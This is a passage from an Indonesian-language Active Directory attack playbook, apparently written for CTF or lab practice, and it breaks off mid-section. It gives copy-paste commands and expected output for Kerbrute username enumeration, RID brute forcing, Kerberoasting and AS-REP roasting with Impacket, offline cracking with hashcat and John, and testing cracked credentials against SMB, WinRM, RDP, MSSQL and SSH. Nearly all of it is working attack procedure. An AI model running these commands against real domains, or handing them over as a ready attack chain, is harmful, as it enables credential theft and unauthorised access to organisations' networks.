echo "$DC_IP $DOMAIN dc01.$DOMAIN dc01" | sudo tee -a /etc/hosts
```

**Output yang diharapkan:**

text

```
[*] DC: 10.10.10.100 | Domain: corp.local | User: john.smith
```

---

## ═══════════════════════════════════════

## FASE 0: KONFIRMASI ENVIRONMENT AD & DC

## ═══════════════════════════════════════

> **Tujuan:** Pastikan kamu benar-benar di environment AD dan DC-nya bisa diakses sebelum buang waktu.

### Langkah 0.1 — Konfirmasi Port Kerberos (88) Aktif

Bash

```
# Command 1: Cek port Kerberos — WAJIB aktif untuk semua operasi di file ini
nmap -Pn -p 88,389,445,636 $DC_IP --open

# Command 2: Konfirmasi via nxc — sekaligus dapat info domain
nxc smb $DC_IP

# Command 3: Cek LDAP juga (dibutuhkan untuk enumeration)
nmap -Pn -p 389,3268 $DC_IP --open
```

**OUTPUT BERHASIL ✅ — Semua port AD aktif:**

text

```
PORT     STATE SERVICE
88/tcp   open  kerberos-sec
389/tcp  open  ldap
445/tcp  open  microsoft-ds
636/tcp  open  ldapssl

SMB  10.10.10.100  445  DC01  [*] Windows Server 2019 Build 17763 x64
     (name:DC01) (domain:CORP.LOCAL) (signing:True) (SMBv1:False)
```

➡️ **Catat semua info dari nxc output:**

|Field|Nilai|Tindakan|
|---|---|---|
|`name:DC01`|Hostname DC|Tambahkan ke `/etc/hosts`|
|`domain:CORP.LOCAL`|Domain name|Set `export DOMAIN="corp.local"`|
|`signing:True`|SMB Signing|NTLM Relay tidak bisa, fokus Kerberos|
|`signing:False`|SMB Signing Off|Simpan untuk NTLM Relay nanti|

Bash

```
# Update variabel jika domain berbeda dari yang kamu set
export DOMAIN="corp.local"   # lowercase biasanya untuk tools Linux
```

**OUTPUT GAGAL ❌ — Port 88 closed:**

text

```
PORT    STATE  SERVICE
88/tcp  closed kerberos-sec
```

➡️ **Ini bukan DC, atau DC di IP berbeda.** Cari DC yang benar:

Bash

```
# Cari DC via SMB — DC selalu running port 88 + 389 + 445 bersamaan
nmap -Pn -p 88,389,445 10.10.10.0/24 --open 2>/dev/null | grep -B2 "88/tcp open"

# Atau dari dalam Windows shell (jika sudah punya shell):
# nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local
```

**OUTPUT GAGAL ❌ — nxc tidak bisa connect:**

text

```
SMB  10.10.10.100  445  [!] Connection refused
```

➡️ Tambahkan `-Pn` ke semua perintah nmap. Coba:

Bash

```
nxc smb $DC_IP --no-bruteforce
ping -c 2 $DC_IP
```

---

### Langkah 0.2 — Sinkronisasi Waktu dengan DC (KRITIS!)

> ⚠️ **Kerberos menolak request jika clock skew > 5 menit.** Ini adalah penyebab error paling umum yang bikin pemula bingung. Lakukan INI SEBELUM apapun.

Bash

```
# Command 1: Cek waktu saat ini vs DC
date
nmap -Pn -p 88 $DC_IP --script krb5-enum-users 2>/dev/null | grep "server time" || \
    nxc smb $DC_IP 2>/dev/null | grep -i "time"

# Command 2: Sync waktu ke DC (PALING RELIABLE di lab)
sudo ntpdate -s $DC_IP 2>/dev/null || \
    sudo ntpdate $DC_IP 2>/dev/null || \
    sudo timedatectl set-ntp false && sudo date -s "$(nmap -Pn -p 445 $DC_IP --script smb2-time 2>/dev/null | grep 'date' | awk '{print $NF}')"

# Command 3: Verifikasi setelah sync
date
timedatectl status
```

**OUTPUT BERHASIL ✅ — Waktu tersinkron:**

text

```
 1 Jan 10:23:45 ntpdate[1234]: adjust time server 10.10.10.100 offset 0.002345 sec
```

**OUTPUT GAGAL ❌ — ntpdate not found:**

text

```
bash: ntpdate: command not found
```

➡️ Install atau gunakan alternatif:

Bash

```
sudo apt install ntpdate -y && sudo ntpdate $DC_IP

# Atau manual — lihat waktu DC dulu, lalu set manual
nxc smb $DC_IP --gen-relay-list /dev/null 2>&1 | grep -i time
```

**Cari di Google jika masih gagal:**

text

```
"sync time kerberos linux parrot os ntpdate alternative"
"timedatectl sync specific server"
```

---

## ═══════════════════════════════════════

## FASE 1: DETEKSI — PUNYA CREDENTIAL ATAU TIDAK?

## ═══════════════════════════════════════

> **Decision point pertama:** Alur attack berbeda tergantung apakah kamu sudah punya domain credential atau belum.

Bash

```
# Cek apakah credential yang kamu punya valid
nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD"
```

**OUTPUT BERHASIL ✅ — Credential valid:**

text

```
SMB  10.10.10.100  445  DC01  [+] CORP\john.smith:Password123!
```

➡️ Langsung ke **FASE 3 (Kerberoasting)** dan **FASE 4 (AS-REP Roasting dengan creds)**

**OUTPUT GAGAL ❌ — Credential invalid / belum punya credential:**

text

```
SMB  10.10.10.100  445  DC01  [-] CORP\john.smith:Password123! STATUS_LOGON_FAILURE
```

➡️ Harus enumerasi username dulu. Ke **FASE 2 (Username Enumeration)**

---

## ═══════════════════════════════════════

## FASE 2: USERNAME ENUMERATION (Jika Belum Punya Credential)

## ═══════════════════════════════════════

> **Tujuan:** Dapat daftar username valid untuk AS-REP Roasting tanpa credential. Username yang valid = tiket masuk ke Kerberos.

### Langkah 2.1 — Kerbrute Username Enumeration

Bash

```
# Setup Kerbrute (jika belum ada)
which kerbrute || (
    wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 -O /tmp/kerbrute
    chmod +x /tmp/kerbrute
    sudo mv /tmp/kerbrute /usr/local/bin/kerbrute
    echo "[+] Kerbrute installed"
)

# Command 1: Wordlist besar (lambat tapi comprehensive)
kerbrute userenum \
    --dc $DC_IP \
    -d $DOMAIN \
    /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
    -o ~/ad_loot/users/valid_users_kerbrute.txt \
    -t 50

# Command 2: Wordlist nama yang lebih terarah (lebih cepat untuk CTF)
kerbrute userenum \
    --dc $DC_IP \
    -d $DOMAIN \
    /usr/share/seclists/Usernames/Names/names.txt \
    -o ~/ad_loot/users/valid_users_names.txt

# Command 3: Wordlist AD-specific (username patterns di AD environment)
kerbrute userenum \
    --dc $DC_IP \
    -d $DOMAIN \
    /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt \
    -o ~/ad_loot/users/valid_users_all.txt
```

**OUTPUT BERHASIL ✅ — Username ditemukan:**

text

```
2024/01/15 10:23:45 >  Using KDC(s):
2024/01/15 10:23:45 >   10.10.10.100:88

2024/01/15 10:23:46 >  [+] VALID USERNAME:  administrator@corp.local
2024/01/15 10:23:46 >  [+] VALID USERNAME:  john.smith@corp.local
2024/01/15 10:23:47 >  [+] VALID USERNAME:  svc_backup@corp.local
2024/01/15 10:23:47 >  [+] VALID USERNAME:  svc_sql@corp.local
2024/01/15 10:23:47 >  [+] AS-REP ROASTABLE: svc_backup@corp.local
```

> ⚠️ **PERHATIKAN baris `AS-REP ROASTABLE`!** Kerbrute langsung memberi tahu jika ada user tanpa pre-auth. Ini berarti kamu bisa langsung roast tanpa perlu validasi lebih lanjut!

➡️ Ekstrak username ke file bersih:

Bash

```
# Dari output kerbrute — bersihkan format
grep "VALID USERNAME" ~/ad_loot/users/valid_users_kerbrute.txt | \
    awk '{print $NF}' | \
    cut -d'@' -f1 | \
    sort -u > ~/ad_loot/users/users.txt

# Cek hasilnya
echo "[*] Total valid users: $(wc -l < ~/ad_loot/users/users.txt)"
cat ~/ad_loot/users/users.txt
```

**OUTPUT GAGAL ❌ — NETWORK ERROR / connection refused:**

text

```
2024/01/15 10:23:46 >  [E] 10.10.10.100:88 NETWORK ERROR - dial tcp: connection refused
```

➡️ Port 88 tidak bisa diakses. Cek:

Bash

```
# Pastikan DC IP benar
nmap -Pn -p 88 $DC_IP

# Cek apakah perlu routing/VPN berbeda
ip route show
curl -s ifconfig.me
```

**OUTPUT GAGAL ❌ — Semua username tidak valid:**

text

```
2024/01/15 10:23:47 >  Done! Tested 1000 usernames (0 valid)
```

➡️ Username di wordlist tidak cocok dengan domain ini. Coba:

Bash

```
# Coba format username berbeda (first.last, flast, firstl, dll)
# Generate username list dari nama yang sudah ketahuan (misal dari web/LinkedIn OSINT)
cat > ~/ad_loot/users/custom_users.txt << 'EOF'
administrator
admin
guest
svc_backup
svc_sql
svc_web
service
backup
EOF

kerbrute userenum --dc $DC_IP -d $DOMAIN ~/ad_loot/users/custom_users.txt

# Cari petunjuk nama dari target — cek port 80/443 jika ada web
curl -s http://$DC_IP/ | grep -iE "(name|user|employee|staff)" | head -20
```

---

### Langkah 2.2 — RID Brute (Alternatif Jika Anonymous SMB Allowed)

Bash

```
# Jika SMB anonymous dibolehkan (dari fase SMB workflow)
nxc smb $DC_IP -u '' -p '' --rid-brute 10000 | grep "SidTypeUser" | \
    awk '{print $6}' | cut -d'\' -f2 | sort -u >> ~/ad_loot/users/users.txt

# Atau dengan user guest
nxc smb $DC_IP -u 'guest' -p '' --rid-brute 10000 | grep "SidTypeUser" | \
    awk '{print $6}' | cut -d'\' -f2 | sort -u >> ~/ad_loot/users/users.txt

# Hapus duplikat
sort -u ~/ad_loot/users/users.txt -o ~/ad_loot/users/users.txt
echo "[*] Total users after RID brute: $(wc -l < ~/ad_loot/users/users.txt)"
```

**OUTPUT BERHASIL ✅:**

text

```
SMB  10.10.10.100  445  DC01  498: CORP\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB  10.10.10.100  445  DC01  500: CORP\Administrator (SidTypeUser)
SMB  10.10.10.100  445  DC01  501: CORP\Guest (SidTypeUser)
SMB  10.10.10.100  445  DC01  1000: CORP\DC01$ (SidTypeUser)
SMB  10.10.10.100  445  DC01  1104: CORP\john.smith (SidTypeUser)
SMB  10.10.10.100  445  DC01  1105: CORP\svc_backup (SidTypeUser)
SMB  10.10.10.100  445  DC01  1106: CORP\svc_sql (SidTypeUser)
```

➡️ Setelah dapat users.txt, lanjut ke **FASE 4 (AS-REP Roasting tanpa creds)**

---

## ═══════════════════════════════════════

## FASE 3: KERBEROASTING

## ═══════════════════════════════════════

> **Prasyarat:** Punya domain credential yang valid (dari FASE 1 valid, atau dari SMB/FTP/file looting sebelumnya)
> 
> **Apa yang dicari:** User account yang memiliki SPN (Service Principal Name). Setiap domain user bisa request TGS untuk service yang punya SPN — ini adalah fitur Kerberos yang legitimate, bukan bug. Yang kita abuse adalah jika password service account-nya lemah.

### Langkah 3.1 — Enumeration SPN (Cari Target)

Bash

```
# Command 1: PALING UMUM — Impacket GetUserSPNs (tanpa request dulu)
# Lihat dulu siapa yang punya SPN sebelum request ticket
impacket-GetUserSPNs \
    -dc-ip $DC_IP \
    $DOMAIN/$USERNAME:$PASSWORD

# Command 2: Jika pakai NTLM hash (bukan password)
# Format: -hashes LMhash:NThash (LM bisa dikosongkan dengan aad3...)
impacket-GetUserSPNs \
    -dc-ip $DC_IP \
    $DOMAIN/$USERNAME \
    -hashes "aad3b435b51404eeaad3b435b51404ee:$NTLM_HASH"

# Command 3: Via NetExec LDAP (one-liner)
nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" --kerberoasting /tmp/spn_check.txt
cat /tmp/spn_check.txt | head -5
```

**OUTPUT BERHASIL ✅ — Ada SPN:**

text

```
ServicePrincipalName                  Name       MemberOf    PasswordLastSet             LastLogon
------------------------------------  ---------  ----------  --------------------------  --------------------------
MSSQLSvc/sql01.corp.local:1433        svc_sql               2023-01-15 10:23:11.123456  2024-01-20 09:15:33.445566
HTTP/web01.corp.local                 svc_web               2022-06-01 08:00:00.000000  <never>
MSSQLSvc/sql01.corp.local             svc_sql               2023-01-15 10:23:11.123456  2024-01-20 09:15:33.445566
```

**Cara baca dan prioritaskan:**

|Indikator|Makna|Prioritas|
|---|---|---|
|`PasswordLastSet` tahun lama (2022, 2021)|Password mungkin stale/tidak dirotasi|🔴 TINGGI|
|`LastLogon <never>`|Account mungkin forgotten service account|🟡 SEDANG|
|`svc_sql`, `svc_web`, `svc_backup`|Service account klasik, sering punya password lemah|🔴 TINGGI|
|`PasswordLastSet` baru (2024)|Password mungkin baru diganti, harder to crack|🟢 RENDAH|

Bash

```
# Simpan info SPN untuk analisis
impacket-GetUserSPNs \
    -dc-ip $DC_IP \
    $DOMAIN/$USERNAME:$PASSWORD \
    2>/dev/null > ~/ad_loot/hashes/spn_list.txt

cat ~/ad_loot/hashes/spn_list.txt
```

**OUTPUT GAGAL ❌ — No entries found:**

text

```
No entries found!
```

➡️ Tidak ada user dengan SPN. Berarti Kerberoasting tidak applicable. Skip ke **FASE 4 (AS-REP Roasting)**

**OUTPUT GAGAL ❌ — Kerberos SessionError: KRB_AP_ERR_SKEW:**

text

```
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

➡️ **WAJIB fix clock skew dulu!** Kembali ke Langkah 0.2.

**OUTPUT GAGAL ❌ — KDC_ERR_PREAUTH_FAILED:**

text

```
Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
```

➡️ Credential salah. Cek:

Bash

```
# Verifikasi credential via SMB dulu (lebih toleran daripada Kerberos)
nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD"

# Cek format domain (kadang perlu uppercase)
impacket-GetUserSPNs -dc-ip $DC_IP "CORP.LOCAL/$USERNAME:$PASSWORD"

# Cek apakah DC IP benar — bisa jadi DC ada di IP lain
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/x.txt 2>/dev/null | grep "domain:CORP"
```

---

### Langkah 3.2 — Request TGS Ticket (Dapatkan Hash)

Bash

```
# Command 1: Request SEMUA TGS sekaligus — simpan ke file
impacket-GetUserSPNs \
    -dc-ip $DC_IP \
    $DOMAIN/$USERNAME:$PASSWORD \
    -request \
    -outputfile ~/ad_loot/hashes/kerberoast_all.txt

# Verifikasi output
echo "[*] Hash file content:"
cat ~/ad_loot/hashes/kerberoast_all.txt | head -5
echo "[*] Total hashes: $(grep -c "krb5tgs" ~/ad_loot/hashes/kerberoast_all.txt 2>/dev/null || echo 0)"
```

**OUTPUT BERHASIL ✅ — Hash TGS didapat:**

text

```
$krb5tgs$23$*svc_sql$CORP.LOCAL$CORP.LOCAL/svc_sql*$a1b2c3d4e5f6...
[hash sangat panjang dalam satu baris]...xyz789
$krb5tgs$23$*svc_web$CORP.LOCAL$CORP.LOCAL/svc_web*$b2c3d4e5f6a1...
[hash sangat panjang]...abc123
```

Bash

```
# Command 2: Targeted — hanya request untuk account tertentu (lebih stealth)
impacket-GetUserSPNs \
    -dc-ip $DC_IP \
    $DOMAIN/$USERNAME:$PASSWORD \
    -request-user svc_sql \
    -outputfile ~/ad_loot/hashes/kerberoast_svc_sql.txt

# Verifikasi hash valid (harus mulai dengan $krb5tgs$)
head -1 ~/ad_loot/hashes/kerberoast_svc_sql.txt
```

**Checklist validasi hash sebelum crack:**

Bash

```
# Cek format file — HARUS mulai dengan $krb5tgs$23$ atau $krb5tgs$18$
head -1 ~/ad_loot/hashes/kerberoast_all.txt

# Cek tidak ada line break di tengah hash
wc -l ~/ad_loot/hashes/kerberoast_all.txt
# Angka baris = jumlah hash. Jika lebih banyak dari jumlah SPN, ada line break

# Buang CRLF jika ada (jika file dari Windows)
tr -d '\r' < ~/ad_loot/hashes/kerberoast_all.txt > ~/ad_loot/hashes/kerberoast_clean.txt
```

**OUTPUT GAGAL ❌ — Hash file kosong:**

text

```
[*] Total hashes: 0
```

➡️ Request berhasil enumerate tapi gagal dapatkan ticket. Coba:

Bash

```
# Coba dengan format NTLM hash jika punya
impacket-GetUserSPNs \
    -dc-ip $DC_IP \
    $DOMAIN/$USERNAME \
    -hashes "aad3b435b51404eeaad3b435b51404ee:NTLM_HASH_HERE" \
    -request \
    -outputfile ~/ad_loot/hashes/kerberoast_pth.txt

# Coba via Rubeus jika ada Windows foothold
# (dari evil-winrm atau shell Windows)
# Rubeus.exe kerberoast /format:hashcat /nowrap /outfile:kerb.txt
```

---

### Langkah 3.3 — Identifikasi Etype Hash

> **Kenapa penting:** Etype menentukan mode hashcat yang harus dipakai. Salah mode = tidak akan crack meskipun password benar!

Bash

```
# Lihat prefix hash untuk identifikasi etype
head -1 ~/ad_loot/hashes/kerberoast_all.txt | cut -c1-20
```

**Cara baca prefix:**

|Prefix|Etype|Hashcat Mode|Keterangan|
|---|---|---|---|
|`$krb5tgs$23$`|RC4-HMAC|**13100**|Paling umum di lab lama, lebih mudah crack|
|`$krb5tgs$17$`|AES128|**19600**|Lebih modern|
|`$krb5tgs$18$`|AES256|**19700**|Paling kuat, butuh wordlist+rules bagus|

Bash

```
# Identifikasi semua etype dalam file
grep -oP '\$krb5tgs\$\K[0-9]+' ~/ad_loot/hashes/kerberoast_all.txt | sort | uniq -c
```

**OUTPUT contoh:**

text

```
      2 23    ← 2 hash dengan RC4 (etype 23) → hashcat mode 13100
      1 18    ← 1 hash dengan AES256 (etype 18) → hashcat mode 19700
```

Bash

```
# Pisahkan per etype untuk cracking yang lebih efisien
grep "\$krb5tgs\$23\$" ~/ad_loot/hashes/kerberoast_all.txt > ~/ad_loot/hashes/kerb_rc4.txt
grep "\$krb5tgs\$18\$" ~/ad_loot/hashes/kerberoast_all.txt > ~/ad_loot/hashes/kerb_aes256.txt
```

---

### Langkah 3.4 — Offline Password Cracking (Kerberoasting)

Bash

```
# ===== HASHCAT (GPU — JAUH LEBIH CEPAT) =====

# Tier 1: RC4 hash dengan rockyou.txt dulu (paling sering berhasil di CTF)
hashcat -m 13100 ~/ad_loot/hashes/kerb_rc4.txt \
    /usr/share/wordlists/rockyou.txt \
    -w 3 \
    --force \
    -o ~/ad_loot/hashes/kerb_cracked.txt

# Cek hasil langsung
hashcat -m 13100 ~/ad_loot/hashes/kerb_rc4.txt --show

# Tier 2: Tambah rules jika Tier 1 gagal
hashcat -m 13100 ~/ad_loot/hashes/kerb_rc4.txt \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule \
    -w 3 \
    --force

# Tier 3: Rules yang lebih aggressive
hashcat -m 13100 ~/ad_loot/hashes/kerb_rc4.txt \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/d3ad0ne.rule \
    -w 3 \
    --force

# Untuk AES256 hash (mode berbeda)
hashcat -m 19700 ~/ad_loot/hashes/kerb_aes256.txt \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule \
    -w 3 \
    --force

# ===== JOHN THE RIPPER (CPU — Fallback) =====
john ~/ad_loot/hashes/kerb_rc4.txt \
    --wordlist=/usr/share/wordlists/rockyou.txt \
    --format=krb5tgs

# Lihat hasil john
john ~/ad_loot/hashes/kerb_rc4.txt --show --format=krb5tgs
```

**OUTPUT BERHASIL ✅ — Password ditemukan:**

text

```
$krb5tgs$23$*svc_sql*CORP.LOCAL*...[hash]...:Summer2023!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Time.Started.....: Mon Jan 15 10:30:00 2024 (2 secs)
Candidates.#1....: Summer2023! <- Summer2023!
```

➡️ **SIMPAN CREDENTIAL LANGSUNG:**

Bash

```
export SVC_USER="svc_sql"
export SVC_PASS="Summer2023!"
echo "$SVC_USER:$SVC_PASS" >> ~/ad_loot/creds/found_creds.txt
echo "[+] CREDENTIAL FOUND: $SVC_USER:$SVC_PASS"

# Validasi credential SEGERA
nxc smb $DC_IP -u "$SVC_USER" -p "$SVC_PASS"
```

➡️ Lanjut ke **FASE 6 (Setelah Dapat Password)**

**OUTPUT GAGAL ❌ — Status Exhausted (semua wordlist habis, tidak ada yang cocok):**

text

```
Status...........: Exhausted
Recovered........: 0/1 (0.00%) Digests
```

➡️ Coba strategi berikutnya:

Bash

```
# Strategi 1: Custom wordlist berbasis konteks target
# Cari kata yang relevan dari: hostname, domain name, company name, service name
printf '%s\n' \
    "Corp2024!" \
    "Corp@2024" \
    "Summer2024!" \
    "Winter2024!" \
    "Spring2024!" \
    "Service123!" \
    "Sql@dmin1" \
    "Welcome1!" \
    "P@ssw0rd" \
    "${DOMAIN%%.*}2024!" \
    "${DOMAIN%%.*}@2024" \
    > ~/ad_loot/hashes/custom_pass.txt

hashcat -m 13100 ~/ad_loot/hashes/kerb_rc4.txt \
    ~/ad_loot/hashes/custom_pass.txt \
    -r /usr/share/hashcat/rules/best64.rule \
    --force

# Strategi 2: CeWL — ambil kata dari website target (jika ada port 80/443)
cewl http://$DC_IP -d 3 -m 5 -o ~/ad_loot/hashes/cewl_words.txt 2>/dev/null && \
hashcat -m 13100 ~/ad_loot/hashes/kerb_rc4.txt \
    ~/ad_loot/hashes/cewl_words.txt \
    -r /usr/share/hashcat/rules/best64.rule \
    --force

# Strategi 3: Wordlist lebih besar
hashcat -m 13100 ~/ad_loot/hashes/kerb_rc4.txt \
    /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt \
    -r /usr/share/hashcat/rules/best64.rule \
    --force
```

**OUTPUT GAGAL ❌ — Token length exception:**

text

```
* Device #1: ATTENTION! OpenCL compiler crashed 'clBuildProgram'!
Token length exception
```

➡️ Hash rusak/terpotong. Re-request:

Bash

```
# Cek isi file
cat -A ~/ad_loot/hashes/kerb_rc4.txt | head -3

# Buang CRLF
tr -d '\r' < ~/ad_loot/hashes/kerb_rc4.txt > ~/ad_loot/hashes/kerb_rc4_clean.txt

# Coba lagi dengan file bersih
hashcat -m 13100 ~/ad_loot/hashes/kerb_rc4_clean.txt --show
```

**Jika masih buntu — cari di Google:**

text

```
"hashcat 13100 token length exception kerberoast fix"
"kerberoast hash format validation"
```

---

## ═══════════════════════════════════════

## FASE 4: AS-REP ROASTING

## ═══════════════════════════════════════

> **Perbedaan dengan Kerberoasting:** AS-REP Roasting menarget user dengan flag `UF_DONT_REQUIRE_PREAUTH`. Bisa dilakukan TANPA credential jika kamu punya username list.
> 
> **Analogi:** Kerberoasting = minta kunci ruangan (butuh tanda masuk). AS-REP Roasting = resepsionis kasih paket tanpa cek identitas dulu.

### Langkah 4.1 — AS-REP Roasting TANPA Credential (Black-box)

Bash

```
# Prasyarat: punya users.txt dari Fase 2

# Command 1: GetNPUsers dengan userlist (paling umum untuk black-box)
impacket-GetNPUsers \
    $DOMAIN/ \
    -dc-ip $DC_IP \
    -usersfile ~/ad_loot/users/users.txt \
    -no-pass \
    -format hashcat \
    -outputfile ~/ad_loot/hashes/asrep_hashes.txt

# Lihat hasilnya
cat ~/ad_loot/hashes/asrep_hashes.txt

# Command 2: Target user spesifik yang sudah diketahui rentan
impacket-GetNPUsers \
    $DOMAIN/svc_backup \
    -dc-ip $DC_IP \
    -no-pass \
    -format hashcat

# Command 3: Dengan explicit domain format
impacket-GetNPUsers \
    corp.local/ \
    -dc-ip $DC_IP \
    -usersfile ~/ad_loot/users/users.txt \
    -no-pass \
    -format hashcat \
    -outputfile ~/ad_loot/hashes/asrep_hashes.txt
```

**OUTPUT BERHASIL ✅ — AS-REP hash didapat:**

text

```
$krb5asrep$23$svc_backup@CORP.LOCAL:a1b2c3d4e5f6789012345678...
[hash sangat panjang dalam satu baris]...xyz789abc
```

➡️ Langsung ke **Langkah 4.3 — Crack AS-REP Hash**

**OUTPUT BERHASIL ✅ — Tapi diselingi error untuk user lain:**

text

```
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$svc_backup@CORP.LOCAL:a1b2c3...
[-] User john.smith doesn't have UF_DONT_REQUIRE_PREAUTH set
```

> ℹ️ Error `KDC_ERR_C_PRINCIPAL_UNKNOWN` = username tidak ada di domain (normal). Error `doesn't have UF_DONT_REQUIRE_PREAUTH set` = user ada tapi tidak vulnerable (normal). Yang penting adalah baris `$krb5asrep$`.

**OUTPUT GAGAL ❌ — Semua user: KDC_ERR_C_PRINCIPAL_UNKNOWN:**

text

```
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN
```

➡️ Username list salah semua. Perlu username yang benar-benar valid:

Bash

```
# Cek apakah users.txt isinya benar
cat ~/ad_loot/users/users.txt

# Coba dengan username yang pasti ada
impacket-GetNPUsers $DOMAIN/administrator -dc-ip $DC_IP -no-pass

# Jika error, berarti format atau DC salah
# Coba uppercase domain
impacket-GetNPUsers "CORP.LOCAL/administrator" -dc-ip $DC_IP -no-pass
```

**OUTPUT GAGAL ❌ — File kosong, semua user punya pre-auth:**

text

```
# File asrep_hashes.txt kosong
# Semua output: "doesn't have UF_DONT_REQUIRE_PREAUTH set"
```

➡️ Tidak ada user tanpa pre-auth di domain ini. AS-REP Roasting tidak applicable. Lanjut ke strategi lain (password spraying, atau sudah punya creds dari cara lain).

---

### Langkah 4.2 — AS-REP Roasting DENGAN Credential

Bash

```
# Lebih reliable — pakai credential yang sudah valid untuk enumerate
impacket-GetNPUsers \
    -dc-ip $DC_IP \
    $DOMAIN/$USERNAME:$PASSWORD \
    -request \
    -format hashcat \
    -outputfile ~/ad_loot/hashes/asrep_with_creds.txt

# Via NetExec — one-liner
nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" \
    --asreproast ~/ad_loot/hashes/asrep_nxc.txt

# Gabungkan semua hash yang ditemukan
cat ~/ad_loot/hashes/asrep_*.txt 2>/dev/null | sort -u > ~/ad_loot/hashes/asrep_all.txt

# Via PowerView (jika ada Windows foothold)
# Get-DomainUser -PreauthNotRequired | Select-Object samaccountname,useraccountcontrol
# Get-ASREPHash -UserName svc_backup -Verbose

# Via Rubeus (dari Windows shell)
# Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep_hashes.txt
```

**OUTPUT BERHASIL ✅:**

text

```
$krb5asrep$23$svc_backup@CORP.LOCAL:6b2c4d8f...
$krb5asrep$23$helpdesk@CORP.LOCAL:9f3e2a1b...
```

---

### Langkah 4.3 — Crack AS-REP Hash

Bash

```
# Verifikasi format hash dulu
head -1 ~/ad_loot/hashes/asrep_all.txt
# Harus mulai dengan: $krb5asrep$23$

# ===== HASHCAT =====
# Mode 18200 = Kerberos 5 AS-REP etype 23

# Tier 1: rockyou.txt langsung
hashcat -m 18200 ~/ad_loot/hashes/asrep_all.txt \
    /usr/share/wordlists/rockyou.txt \
    -w 3 \
    --force \
    -o ~/ad_loot/hashes/asrep_cracked.txt

# Cek hasil
hashcat -m 18200 ~/ad_loot/hashes/asrep_all.txt --show

# Tier 2: Tambah rules
hashcat -m 18200 ~/ad_loot/hashes/asrep_all.txt \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule \
    -w 3 \
    --force

# Tier 3: Custom wordlist + rules
hashcat -m 18200 ~/ad_loot/hashes/asrep_all.txt \
    ~/ad_loot/hashes/custom_pass.txt \
    -r /usr/share/hashcat/rules/best64.rule \
    --force

# ===== JOHN =====
john ~/ad_loot/hashes/asrep_all.txt \
    --wordlist=/usr/share/wordlists/rockyou.txt \
    --format=krb5asrep

john ~/ad_loot/hashes/asrep_all.txt --show --format=krb5asrep
```

**OUTPUT BERHASIL ✅:**

text

```
$krb5asrep$23$svc_backup@CORP.LOCAL:...[hash]...:Backup2022

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
```

➡️ **SIMPAN DAN VALIDASI:**

Bash

```
export ROASTED_USER="svc_backup"
export ROASTED_PASS="Backup2022"
echo "$ROASTED_USER:$ROASTED_PASS" >> ~/ad_loot/creds/found_creds.txt
echo "[+] AS-REP CRACKED: $ROASTED_USER:$ROASTED_PASS"

# Validasi credential
nxc smb $DC_IP -u "$ROASTED_USER" -p "$ROASTED_PASS"
```

**OUTPUT GAGAL ❌ — Semua wordlist exhausted:**

text

```
Status...........: Exhausted
Recovered........: 0/2 (0.00%) Digests
```

➡️ Sama seperti Kerberoasting — coba custom wordlist dan rules. Lihat Langkah 3.4 strategi.

---

## ═══════════════════════════════════════

## FASE 5: VALIDASI CREDENTIAL — CEK KE SEMUA SERVICE

## ═══════════════════════════════════════

> **Mindset:** Password ditemukan ≠ selesai. Harus tahu password ini bisa dipakai di mana dan privilege apa yang dimiliki. Credential dari roasting sering reusable ke service lain!

### Langkah 5.1 — Validasi Privilege Level

Bash

```
# Set variabel dengan credential yang baru ditemukan
export FOUND_USER="svc_sql"     # atau svc_backup, atau apapun yang berhasil di-crack
export FOUND_PASS="Summer2023!" # password hasil crack

# Validasi ke DC dulu
nxc smb $DC_IP -u "$FOUND_USER" -p "$FOUND_PASS"
```

**OUTPUT BERHASIL ✅ — Standard domain user:**

text

```
SMB  10.10.10.100  445  DC01  [+] CORP\svc_sql:Summer2023!
```

(Tidak ada `(Pwn3d!)` = bukan local admin)

**OUTPUT BERHASIL ✅ — LOCAL ADMIN (JACKPOT):**

text

```
SMB  10.10.10.100  445  DC01  [+] CORP\svc_sql:Summer2023! (Pwn3d!)
```

➡️ Langsung ke **Fase 7 — Exploitation**

---

### Langkah 5.2 — Test ke Semua Service Aktif

Bash

```
# JALANKAN SEMUA — lihat mana yang connect

echo "=== Testing SMB ==="
nxc smb $DC_IP -u "$FOUND_USER" -p "$FOUND_PASS" --shares

echo "=== Testing WinRM (port 5985) ==="
nxc winrm $DC_IP -u "$FOUND_USER" -p "$FOUND_PASS"

echo "=== Testing RDP (port 3389) ==="
nxc rdp $DC_IP -u "$FOUND_USER" -p "$FOUND_PASS"

echo "=== Testing MSSQL (port 1433) ==="
nxc mssql $DC_IP -u "$FOUND_USER" -p "$FOUND_PASS"

echo "=== Testing SSH (port 22) ==="
nxc ssh $DC_IP -u "$FOUND_USER" -p "$FOUND_PASS"

# Juga test ke host lain yang ditemukan di network
# (Ganti DC_IP dengan IP host lain jika ada)
```

**OUTPUT BERHASIL ✅ — WinRM Pwn3d:**

text

```
